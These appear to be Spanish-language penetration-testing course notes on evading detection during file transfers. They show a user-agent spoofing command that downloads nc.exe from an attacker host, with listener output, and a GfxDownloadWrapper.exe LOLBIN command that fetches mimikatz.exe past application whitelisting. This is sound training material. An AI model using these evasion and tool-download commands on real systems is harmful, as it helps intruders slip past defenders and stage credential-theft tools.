# Evading Detection

## Cambio de Agente de Usuario

Si los administradores o defensores diligentes han incluido en la lista negra alguno de estos **agentes de usuario**, `Invoke-WebRequest` contiene un parámetro **UserAgent**, que permite cambiar el agente de usuario predeterminado para emular navegadores como **Internet Explorer**, **Firefox**, **Chrome**, **Opera** o **Safari**. Por ejemplo, si internamente se utiliza **Chrome**, establecer este agente de usuario puede hacer que la solicitud parezca legítima.

### Listado de Agentes de Usuario

```bash
PS C:\htb> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**InternetExplorer**\
User Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

**FireFox**\
User Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

**Chrome**\
User Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6

**Opera**\
User Agent: Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

**Safari**\
User Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16

### Invocar `Invoke-WebRequest` para descargar **nc.exe** usando un Agente de Usuario de **Chrome**

```bash
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

**Resultado del servidor:**

```bash
sherlock28@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

## LOLBAS / GTFOBins

El **whitelisting de aplicaciones** puede impedirte usar **PowerShell** o **Netcat**, y el registro de la línea de comandos puede alertar a los defensores sobre tu presencia. En este caso, una opción puede ser utilizar un **LOLBIN** (Living Off The Land Binary), también conocido como "binarios de confianza mal ubicada". Un ejemplo de **LOLBIN** es el **Intel Graphics Driver for Windows 10** (**GfxDownloadWrapper.exe**), instalado en algunos sistemas y que contiene una funcionalidad para descargar archivos de configuración periódicamente. Esta funcionalidad de descarga puede invocarse de la siguiente manera:

### Transferencia de archivo con **GfxDownloadWrapper.exe**

```bash
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Este binario puede estar permitido para ejecutarse por el **whitelisting de aplicaciones** y excluirse de las alertas. Otros binarios más comunes también están disponibles, y vale la pena revisar el proyecto **LOLBAS** para encontrar un binario adecuado de "descarga de archivos" que exista en tu entorno. El equivalente en **Linux** es el proyecto **GTFOBins**, que también vale la pena revisar. Al momento de escribir esto, el proyecto **GTFOBins** proporciona información útil sobre casi 40 binarios comúnmente instalados que pueden utilizarse para realizar transferencias de archivos.

## Reflexiones Finales

Como hemos visto en este módulo, existen muchas formas de transferir archivos hacia y desde nuestro host de ataque entre sistemas **Windows** y **Linux**. Vale la pena practicar tantas de estas técnicas como sea posible a lo largo de los módulos del camino de **Penetration Tester**.

¿Tienes una **web shell** en un objetivo? Prueba descargando un archivo al objetivo para realizar una enumeración adicional usando **Certutil**. ¿Necesitas descargar un archivo del objetivo? Prueba un servidor **SMB** de **Impacket** o un servidor web de **Python** con capacidades de carga. Refiérete a este módulo periódicamente y esfuérzate en usar todos los métodos enseñados de alguna manera. Además, tómate un tiempo cuando estés trabajando en un objetivo o laboratorio para buscar un **LOLBin** o **GTFOBin** que nunca hayas utilizado para lograr tus objetivos de transferencia de archivos.
